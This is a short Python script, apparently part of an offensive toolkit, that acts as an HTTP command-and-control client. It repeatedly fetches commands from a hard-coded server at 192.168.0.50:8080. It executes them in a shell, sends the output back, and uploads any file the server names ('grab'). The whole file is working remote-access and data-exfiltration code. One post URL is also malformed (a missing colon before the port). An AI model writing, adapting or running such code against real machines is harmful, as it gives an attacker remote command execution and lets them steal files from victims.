#!/usr/bin/env python
# Filename: http_exfiltration_client.py
# This program is optimized for Python 3.4
# Description: Client side implementation to send files to a listening server
#   counterpart: http_exfiltration_server.py


import requests
import os
import subprocess
import time

while True:
    req = requests.get('http://192.168.0.50:8080')
    command = req.text
    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path): 
            url = "http://192.168.0.50:8080/store" 
            files = {'file': open(path, 'rb')} 
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://192.168.0.50:8080', data='[-] File not found'.encode())
    else:
        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.0.508080', data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.0.50:8080', data=CMD.stderr.read())
    time.sleep(3)

